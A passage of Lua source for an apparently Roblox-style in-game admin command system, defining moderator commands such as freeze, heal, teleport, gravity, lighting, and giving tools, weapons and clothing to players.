for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end)()
end
end)

set.MakeCommand('Removes force fields on the target player(s)',2,set.Prefix,{'unff','unforcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function() 
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Removes the target player(s)\'s character',2,set.Prefix,{'punish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Parent = set.Storage
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) hat pets, controled using the !pets command.',-1,set.Prefix,{'hatpets'},{'player','number[50 MAX]/destroy'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2] and args[2]:lower()=='destroy' then
			local hats=v.Character:FindFirstChild('EpixHatPets')
			if hats then hats:Destroy() end
		else
			local num=tonumber(args[2]) or 5
			if num>50 then num=50 end
			if v.Character:FindFirstChild('Torso') then
				local m=v.Character:FindFirstChild('EpixHatPets')
				local mode
				local obj
				local hat
				if not m then
					m=Instance.new('Model',v.Character)
					m.Name='EpixHatPets'
					table.insert(set.objects,m)
					mode=Instance.new('StringValue',m)
					mode.Name='Mode'
					mode.Value='Follow'
					obj=Instance.new('ObjectValue',m)
					obj.Name='Target'
					obj.Value=v.Character.Torso
				else
					mode=m.Mode
					obj=m.Target
				end
				for l,h in pairs(v.Character:children()) do if h:IsA('Hat') then hat=h break end end
				if hat then
					for k=1,num do
						local cl=hat.Handle:clone()
						cl.Name=k
						cl.CanCollide=false
						cl.Anchored=false
						cl.Parent=m
						local bpos=Instance.new("BodyPosition",cl)
						bpos.Name='bpos'
						bpos.position=obj.Value.Position
						bpos.maxForce = bpos.maxForce * 10
					end
				end
				set.Remote(v,'Function','MoveHats')
			end
		end
	end
end)

set.MakeCommand('[NEED HAT PETS TO USE] Makes your hat pets do the specified command (follow/float/swarm/attack)',2,set.AnyPrefix,{'pets'},{'follow/float/swarm/attack','player'},2,function(plr,args)
	local hats=plr.Character:FindFirstChild('EpixHatPets')
	if hats then
		for i,v in pairs(set.GetPlayers(plr,args[2])) do
			if v.Character:FindFirstChild('Torso') and v.Character.Torso:IsA('Part') then
				if args[1]:lower()=='follow' then
					hats.Mode.Value='Follow'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='float' then
					hats.Mode.Value='Float'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='swarm' then
					hats.Mode.Value='Swarm'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='attack' then
					hats.Mode.Value='Attack'
					hats.Target.Value=v.Character.Torso
				end
			end
		end
	else
		set.Remote(plr,'Function','OutputGui',"You don't have any hat pets! If you are an admin use the :hatpets command to get some")
	end
end)

set.MakeCommand('UnPunishes the target player(s)',2,set.Prefix,{'unpunish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
v.Character.Parent = game:service("Workspace") v.Character:MakeJoints()
end
end)

set.MakeCommand('Freezes the target player(s)',2,set.Prefix,{'freeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end)()
end
end)

set.MakeCommand('UnFreezes the target players, thaws them out',2,set.Prefix,{'thaw','unfreeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end)()
end
end)

set.MakeCommand('Heals the target player(s) (Regens their health)',2,set.Prefix,{'heal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) immortal, makes their health so high that normal non-explosive weapons can\'t kill them',2,set.Prefix,{'god','immortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) mortal again',2,set.Prefix,{'ungod','mortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Change Ambient',2,set.Prefix,{'ambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').Ambient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Change OutdoorAmbient',2,set.Prefix,{'oambient','outdoorambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Off',2,set.Prefix,{'nofog','fogoff'},{},0,function(plr,args)
game:service('Lighting').FogEnd=1000000000000
end)

set.MakeCommand('Determines if shadows are on or off',2,set.Prefix,{'shadows'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').GlobalShadows=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').GlobalShadows=false
end
end)

set.MakeCommand('Determines if outlines are on or off',2,set.Prefix,{'outlines'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').Outlines=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').Outlines=false
end
end)

set.MakeCommand('Repeats <command> for <amount> of times every <interval> seconds',2,set.Prefix,{'repeat','loop'},{'amount','interval','command'},3,function(plr,args)
local amount = tonumber(args[1])
local timer = tonumber(args[2])
if timer<=0 then timer=1 end
local command = args[3]:lower()
local num=0
coroutine.wrap(function()
repeat
set.ProcessCommand(plr,command,true)
wait(timer)
num=num+1
until num==amount
end)()
end)

set.MakeCommand('Change Brightness',2,set.Prefix,{'brightness'},{'number'},1,function(plr,args)
game:service('Lighting').Brightness =args[1]
end)

set.MakeCommand('Change Time',2,set.Prefix,{'time','timeofday'},{'time'},1,function(plr,args)
game:service('Lighting').TimeOfDay = args[1]
end)

set.MakeCommand('Fog Color',2,set.Prefix,{'fogcolor'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').FogColor = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Start/End',2,set.Prefix,{'fog'},{'start','end'},2,function(plr,args)
game:service('Lighting').FogEnd = args[2]
game:service('Lighting').FogStart = args[1]
end)

set.MakeCommand('Gives the target player(s) basic building tools and the F3X tool',2,set.Prefix,{'btools','buildtools','buildingtools','buildertools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local tool = Instance.new("Tool", v.Backpack)
tool.Name = "F3X Building Tools"
tool.GripForward = Vector3.new(0, 0, -1)
tool.GripPos = Vector3.new(0, 0, 0.4)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0, 1, 0)
local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.BrickColor = BrickColor.new("Lavender")
handle.Anchored = false
handle.CanCollide = true
handle.Locked = true
handle.Elasticity = 0.5
handle.Friction = 0.3
handle.Shape = "Block"
handle.BackSurface = "Smooth" handle.BottomSurface = "Smooth" handle.FrontSurface = "Smooth" handle.LeftSurface = "Smooth" handle.RightSurface = "Smooth" handle.TopSurface = "Smooth"
handle.Size = Vector3.new(0.8,0.8,0.8)
for _,ws in pairs (deps.wpns["F3X Building Tools"]:GetChildren()) do
local m = ws:Clone()
m.Parent = tool
if m.ClassName == "Script" or m.ClassName == "LocalScript" then
m.Disabled = false
end end
local t4 = Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl=deps.ResizeScript:clone()
cl.Parent=t4
cl.Disabled=false
end
end)()
end
end)

set.MakeCommand('Gives player(s) Classic Weapons',2,set.Prefix,{'weapons', 'bweapons', 'classicweapons', 'weps'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") then 
local tool = Instance.new("Tool", v.Backpack)
tool.Name = "PaintballGun" 
tool.TextureId = "rbxasset://Textures/PaintballIcon.png"
tool.GripForward = Vector3.new(0, -1, 0)
tool.GripPos = Vector3.new(0, 0.4, 0.5)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0, 0, -1)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(1, 3, 2)
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/PaintballGun.mesh" msh.TextureId = "rbxasset://textures/PaintballGunTex128.png"
local shoot = Instance.new("Sound", handle) shoot.Name = "Fire" shoot.SoundId = "rbxasset://sounds//paintball.wav" shoot.Volume = 1

for _,v in pairs (deps.wpns.PaintballGun:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end
local rel = Instance.new("NumberValue", tool) rel.Name = "rel" rel.Value = 0.5
local wl = deps.wpns["Local Gui"]:Clone() wl.Parent = tool wl.Disabled = false

local tool = Instance.new("Tool", v.Backpack)
tool.Name = "RocketLauncher" 
tool.TextureId = "rbxasset://Textures/Rocket.png"
tool.GripForward = Vector3.new(-1, 0, 0)
tool.GripPos = Vector3.new(-1, -0.75, 0.25)
tool.GripRight = Vector3.new(0, 0, -1)
tool.GripUp = Vector3.new(0, 1, 0)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(4, 0.8, 1)
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/rocketlauncher.mesh" msh.TextureId = "rbxasset://textures/rocketlaunchertex.png" msh.Scale = Vector3.new(0.75,0.75,0.75)
local shoot = Instance.new("Sound", tool) shoot.Name = "Explosion" shoot.SoundId = "rbxasset://sounds/collide.wav" shoot.Volume = 1
local shoot = Instance.new("Sound", tool) shoot.Name = "Swoosh" shoot.SoundId = "rbxasset://sounds/Rocket whoosh 01.wav" shoot.Volume = 1

for _,v in pairs (deps.wpns.RocketLauncher:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end
local rel = Instance.new("NumberValue", tool) rel.Name = "rel" rel.Value = 7
local wl = deps.wpns["Local Gui"]:Clone() wl.Parent = tool wl.Disabled = false

local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Slingshot" 
tool.TextureId = "rbxasset://Textures/Slingshot.png"
tool.GripForward = Vector3.new(0, 0, -1)
tool.GripPos = Vector3.new(0, -0.7, 0)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0, 1, 0)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(2, 2.4, 1)
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/slingshot.mesh" msh.TextureId = "rbxasset://textures/SlingshotTexture.png" msh.Scale = Vector3.new(0.5,0.5,0.5)
local shoot = Instance.new("Sound", handle) shoot.Name = "SlingshotSound" shoot.SoundId = "rbxasset://sounds//Rubber band sling shot.wav" shoot.Volume = 1

for _,v in pairs (deps.wpns.Slingshot:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end
local rel = Instance.new("NumberValue", tool) rel.Name = "rel" rel.Value = 0.2
local wl = deps.wpns["Local Gui"]:Clone() wl.Parent = tool wl.Disabled = false

local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Superball" 
tool.TextureId = "rbxasset://Textures/Superball.png"
tool.GripForward = Vector3.new(0, 0, -1)
tool.GripPos = Vector3.new(0, 0, 0)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0, 1,0)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(2, 2, 2) handle.Shape = "Ball" handle.Reflectance = 0.2 handle.BrickColor = BrickColor.new("Bright red") handle.TopSurface = 0 handle.BottomSurface = 0
local shoot = Instance.new("Sound", handle) shoot.Name = "Boing" shoot.SoundId = "rbxasset://sounds//short spring sound.wav" shoot.Volume = 1

for _,v in pairs (deps.wpns.Superball:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end
local rel = Instance.new("NumberValue", tool) rel.Name = "rel" rel.Value = 2
local wl = deps.wpns["Local Gui"]:Clone() wl.Parent = tool wl.Disabled = false

local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
for _,hs in pairs (deps.wpns.Sword:GetChildren()) do local e = hs:Clone() e.Parent = sword e.Disabled = false end

local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Timebomb" 
tool.TextureId = "rbxasset://Textures/Bomb.png"
tool.GripForward = Vector3.new(0, 1, 0)
tool.GripPos = Vector3.new(0,0,0)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(2, 2, 2) handle.Shape = "Ball"
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/timebomb.mesh" msh.TextureId = "rbxasset://textures/bombtex.png"

for _,v in pairs (deps.wpns.Timebomb:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end

local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Trowel" 
tool.TextureId = "rbxasset://Textures/Wall.png"
tool.GripForward = Vector3.new(0, 0, -1)
tool.GripPos = Vector3.new(0, -1.3, 0)
tool.GripRight = Vector3.new(1, 0, 0)
tool.GripUp = Vector3.new(0, 1, 0)
local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(1, 4.4, 1)
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/trowel.mesh" msh.TextureId = "rbxasset://textures/TrowelTexture.png"
local shoot = Instance.new("Sound", handle) shoot.Name = "BuildSound" shoot.SoundId = "rbxasset://sounds//bass.wav" shoot.Volume = 1

for _,v in pairs (deps.wpns.Trowel:GetChildren()) do
local d = v:Clone() d.Parent = tool d.Disabled = false end
local rel = Instance.new("NumberValue", tool) rel.Name = "rel" rel.Value = 5
local wl = deps.wpns["Local Gui"]:Clone() wl.Parent = tool wl.Disabled = false
end
end)()
end
end)

set.MakeCommand('Gives player(s) admins laser pointer',2,set.Prefix,{'laser', 'laserpointer', 'lpointer'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") and deps.wpns:FindFirstChild("Laser") then 
local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Laser Pointer"
tool.GripForward = Vector3.new(0,-1,0)
tool.GripPos = Vector3.new(0,0,0)
tool.GripRight = Vector3.new(0, 0, 1)
tool.GripUp = Vector3.new(1,0,0)
local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.BrickColor = BrickColor.new("ToothPaste")
handle.Anchored = false
handle.CanCollide = true
handle.Locked = true
handle.Elasticity = 0.5
handle.Friction = 0.5
handle.Shape = "Block"
handle.BackSurface = "Smooth" handle.BottomSurface = "Smooth" handle.FrontSurface = "Smooth" handle.LeftSurface = "Smooth" handle.RightSurface = "Smooth" handle.TopSurface = "Smooth"
handle.Size = Vector3.new(1,1.2,1)
for _,ws in pairs (deps.wpns.Laser:GetChildren()) do
local m = ws:Clone()
m.Parent = tool
m.Disabled = false
end
end
end)()
end
end)

set.MakeCommand('Places the desired tool into the target player(s)\'s StarterPack',2,set.Prefix,{'startergive'},{'player','toolname'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then 
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():find(args[2]:lower()) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) the desired tool(s)',2,set.Prefix,{'give','tool'},{'player','tool'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():sub(1,#args[2])==args[2]:lower() then 
	tool:clone().Parent = v.Backpack 
end
end
end
end)()
end
end)

set.MakeCommand('Steals player1\'s tools and gives them to player2',2,set.Prefix,{'steal','stealtools'},{'player1','player2'},2,function(plr,args)
local p1 = set.GetPlayers(plr, args[1]:lower())
local p2 = set.GetPlayers(plr, args[2]:lower())
coroutine.wrap(function()
for i,v in pairs(p1) do
	coroutine.wrap(function()
	for k,m in pairs(p2) do
		for j,n in pairs(v.Backpack:children()) do
			print(n.Name)
			local b=n:clone()
			n.Parent=m.Backpack
		end
	end
	v.Backpack:ClearAllChildren()
	end)()
end
end)()
end)

set.MakeCommand('Remove the target player(s)\'s screen guis',2,set.Prefix,{'removeguis','noguis'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(v,'Function','RemoveGuis')
	end
end)

set.MakeCommand('Remove the target player(s)\'s tools',2,set.Prefix,{'removetools','notools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Shows you what rank the target player(s) are in the group specified by groupID',2,set.Prefix,{'rank','getrank'},{'player','groupID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:IsInGroup(args[2]) then 
set.Hint("[" .. v:GetRankInGroup(args[2]) .. "] " .. v:GetRoleInGroup(args[2]), {plr})
elseif v and not v:IsInGroup(args[2])then
set.Hint(v.Name .. " is not in the group " .. args[2], {plr})
end
end)()
end
end)

set.MakeCommand('Removes <number> HP from the target player(s)',2,set.Prefix,{'damage','hurt'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid:TakeDamage(args[2])
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s gravity normal',2,set.Prefix,{'grav','bringtoearth'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s gravity',2,set.Prefix,{'setgrav','gravity','setgravity'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*tonumber(args[2]),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*tonumber(args[2]),0) end end
end
end)()
end
end)

set.MakeCommand('NoGrav the target player(s)',2,set.Prefix,{'nograv','nogravity','superjump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s health to <number>',2,set.Prefix,{'health','sethealth'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = args[2]
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s WalkSpeed to <number>',2,set.Prefix,{'speed','setspeed','walkspeed'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.WalkSpeed = args[2]
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s team to <team>',2,set.Prefix,{'team','setteam','changeteam'},{'player','team'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and game:findFirstChild("Teams") then 
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(args[2]:lower()) == 1 then v.Neutral = false v.TeamColor = tm.TeamColor end
end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s field of view to <number> (min 1, max 120)',-1,set.Prefix,{'fov','fieldofview'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','FieldOfView',args[2])
	end
end)

set.MakeCommand('Teleport the target player(s) to the place belonging to <placeID>',2,set.Prefix,{'place'},{'player','placeID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
set.PromptPlaceTeleport(v,"Teleport to "..args[2].."?",args[2])
end)()
end
end)

set.MakeCommand('Teleport player1(s) to player2, a waypoint, or specific coords, use :tp player1 waypoint-WAYPOINTNAME to use waypoints, x,y,z for coords',2,set.Prefix,{'tp','teleport'},{'player1','player2'},2,function(plr,args)
if args[2]:match('^waypoint%-(.*)') then
	local m=args[2]:match('^waypoint%-(.*)')
	local point
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#m)==m:lower() then
			point=v
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if point then
			v.Character:MoveTo(point)
		end
	end
	if not point then set.Hint('Waypoint '..m..' was not found.',{plr}) end
elseif args[2]:find(',') then
	local x,y,z=args[2]:match('(.*),(.*),(.*)')
	for i,v in pairs(set.GetPlayers(plr,args[1])) do 
		v.Character:MoveTo(Vector3.new(tonumber(x),tonumber(y),tonumber(z))) 
	end
else
	local plrz = set.GetPlayers(plr, args[1]:lower())
	local plrz2 = set.GetPlayers(plr, args[2]:lower())
	for i, v in pairs(plrz) do
	coroutine.wrap(function()
	for i2, v2 in pairs(plrz2) do
	if v and v2 and v.Character and v2.Character and v.Character:FindFirstChild('Humanoid') and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
	if v.Character.Humanoid.Sit==true then
	v.Character.Humanoid.Sit=false
	wait(0.5)
	end
	v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
	end
	end
	end)()
	end
end
end)

set.MakeCommand('Teleport the target player(s) up by <height> studs',-1,set.Prefix,{'freefall','skydive'},{'player','height'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character:FindFirstChild('Torso') then 
v.Character.Torso.CFrame=v.Character.Torso.CFrame+Vector3.new(0,tonumber(args[2]),0)
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s leader stat <stat> value to <value>',2,set.Prefix,{'change','leaderstat','stat'},{'player','stat','value'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then 
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(args[2]:lower()) == 1 then st.Value = args[3] end
end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the shirt that belongs to <id>',2,set.Prefix,{'shirt','giveshirt'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Shirt") then k:Destroy() end
end
local s=Instance.new('Shirt',v.Character)
s.ShirtTemplate="http://unixfr.xyz/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the pants that belongs to <id>',2,set.Prefix,{'pants','givepants'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Pants") then k:Destroy() end
end
local s=Instance.new('Pants',v.Character)
s.PantsTemplate="http://unixfr.xyz/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the face that belongs to <id>',2,set.Prefix,{'face','giveface'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if not v.Character:FindFirstChild("Head") then return end
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then 
v.Character.Head:findFirstChild("face"):Destroy()--.Texture = "http://unixfr.xyz/asset/?id=" .. args[2]
end
game:service('InsertService'):LoadAsset(tonumber(args[2])):children()[1].Parent=v.Character:FindFirstChild("Head")
end)()
end
end)

set.MakeCommand('Swag the target player(s) up',-1,set.Prefix,{'swagify','swagger'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.unixfr.xyz/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.unixfr.xyz/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
set.Cape(v,'Fabric','Pink',109301474)
end
end)()
end
end)

set.MakeCommand('Rises the target player(s) up',-1,set.Prefix,{'gamer','gameify','riseup'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "https://finobe.com/asset?id=54527" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "https://finobe.com/asset?id=40800" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
set.Cape(v,'Grass','Parsley green',"Bruh Ganja")
v.Character.EpicCape.Decal.Texture = "https://finobe.com/asset?id=54246"
v.Character.Head.face.Texture = "http://www.unixfr.xyz/asset/?id=9993495"
v.Character.Head.BrickColor = BrickColor.new("Lily white")
end
end)()
end
end)

